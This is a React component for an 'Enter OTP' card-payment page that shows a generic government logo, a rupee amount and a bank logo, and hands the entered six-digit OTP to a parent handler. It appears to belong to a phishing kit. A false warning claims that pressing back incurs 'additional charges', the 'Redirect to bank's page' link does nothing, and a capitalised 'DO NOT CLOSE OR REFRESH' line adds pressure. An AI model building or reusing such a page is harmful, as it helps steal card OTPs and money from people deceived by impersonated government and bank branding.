import React, { useState, useEffect, useRef } from 'react';
import { ArrowLeft } from 'lucide-react';

interface OTPVerificationPageProps {
  onBack: () => void;
  onConfirm: (otp: string) => void;
  isLoading: boolean;
  invalidOtpMessage: string;
  cardNumber: string;
  amount: string;
  bankLogo?: string;
}

const OTPVerificationPage: React.FC<OTPVerificationPageProps> = ({
  onBack,
  onConfirm,
  isLoading,
  invalidOtpMessage,
  cardNumber,
  amount,
  bankLogo
}) => {
  const [otp, setOtp] = useState('');
  const [timer, setTimer] = useState(300); // 5 minutes in seconds
  const [showResendOtp, setShowResendOtp] = useState(false);
  const otpInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Auto-focus on OTP input when component mounts
    if (otpInputRef.current) {
      otpInputRef.current.focus();
    }
  }, []);

  useEffect(() => {
    // Show resend OTP after 10 seconds
    const resendTimer = setTimeout(() => {
      setShowResendOtp(true);
    }, 10000);

    return () => clearTimeout(resendTimer);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}.${secs.toString().padStart(2, '0')}`;
  };

  const getLastFourDigits = () => {
    return cardNumber.replace(/\s/g, '').slice(-4);
  };

  const handleBackClick = () => {
    const confirmed = window.confirm('Do you want to cancel this transaction? Pressing back will result in additional charges.');
    if (confirmed) {
      window.location.href = '/';
    }
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
  };

  const handleConfirmPayment = () => {
    if (otp.length === 6) {
      onConfirm(otp);
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && otp.length === 6) {
      handleConfirmPayment();
    }
  };

  // Add resend OTP handler
  const handleResendOtp = () => {
    setTimer(299); // 4:59 in seconds
    setShowResendOtp(false);
    setOtp('');
    // Show the resend button again after 10 seconds
    setTimeout(() => setShowResendOtp(true), 10000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between py-2 px-4 border-b">
        <button 
          onClick={handleBackClick}
          className="p-2 hover:bg-gray-100 rounded-full"
        >
          <ArrowLeft className="w-5 h-5 text-gray-600" />
        </button>
        
        <div className="flex-1 flex justify-center">
          <img 
            src="/lovable-uploads/40768023-71d9-41cc-8cd5-c292a76218c2.png" 
            alt="Government Logo"
            className="h-12 w-auto"
          />
        </div>
        
        <div className="w-9"></div> {/* Spacer for centering */}
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 max-w-md mx-auto w-full">
        <div className="w-full space-y-6">
          {/* Title */}
          <div className="text-center mt-[-24px]">
            <h1 className="text-xl font-medium text-gray-800 mb-2">Enter OTP</h1>
            <p className="text-sm text-gray-600 flex items-center justify-center">
              Total Payable Amount ₹{amount}
              <span className="ml-2 w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                <span className="text-white text-xs">i</span>
              </span>
            </p>
          </div>

          {/* Divider */}
          <div className="w-full h-px bg-gray-200 shadow-sm"></div>

          {/* Bank Logo */}
          <div className="flex justify-center py-4">
            {bankLogo ? (
              <img
                src={bankLogo}
                alt="Bank Logo"
                className="inline-block w-24 h-auto object-contain mb-3"
                onError={(e) => {
                  const target = e.currentTarget as HTMLImageElement;
                  target.onerror = null; // prevent infinite loop
                  target.src = '/fallback-logo.png'; // show a fallback image
                }}
              />
            ) : (
              <div className="w-24 h-24 bg-gray-200 flex items-center justify-center rounded-full mb-3">
                <span className="text-gray-500">No Logo</span>
              </div>
            )}
          </div>

          {/* OTP Instructions */}
          <div className="text-center">
            <p className="text-sm text-gray-700 mb-4">
              Enter OTP sent to card ending in ****{getLastFourDigits()}
            </p>

            {/* Invalid OTP Message */}
            {invalidOtpMessage && (
              <div className="mb-4 p-3 border border-red-300 bg-red-50 rounded text-red-600 text-sm">
                {invalidOtpMessage}
              </div>
            )}

            {/* OTP Input */}
            <div className="relative mb-4">
              <input
                ref={otpInputRef}
                type="text"
                value={otp}
                onChange={handleOtpChange}
                onKeyPress={handleKeyPress}
                placeholder="Enter OTP"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-center text-lg tracking-widest focus:outline-none focus:border-blue-500"
                maxLength={6}
                disabled={isLoading}
              />
              {showResendOtp && (
                <button
                  type="button"
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-blue-600 text-sm hover:underline"
                  onClick={handleResendOtp}
                  disabled={isLoading}
                >
                  Resend OTP
                </button>
              )}
            </div>

            {/* Confirm Payment Button */}
            <button
              type="button"
              onClick={handleConfirmPayment}
              disabled={otp.length !== 6 || isLoading}
              className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
                otp.length === 6 && !isLoading
                  ? 'bg-blue-500 text-white hover:bg-blue-600'
                  : 'bg-gray-300 text-gray-500 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                  <span className="opacity-70">Processing...</span>
                </div>
              ) : (
                'CONFIRM PAYMENT'
              )}
            </button>

            {/* Timer */}
            <p className="text-sm text-gray-600 mt-4">
              OTP will expire in {formatTime(timer)} minutes
            </p>

            {/* Bank Website Link */}
            <div className="mt-6 text-center">
              <p className="text-xs text-gray-500 mb-1">
                You can always complete the transaction on your
              </p>
              <p className="text-xs text-gray-500 mb-1">
                bank's website. <span className="text-blue-600 underline cursor-pointer">Redirect to bank's page</span>
              </p>
            </div>

            {/* Warning */}
            <div className="mt-6 text-center">
              <p className="text-sm font-semibold text-gray-800">
                DO NOT CLOSE OR REFRESH THE PAGE
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerificationPage;
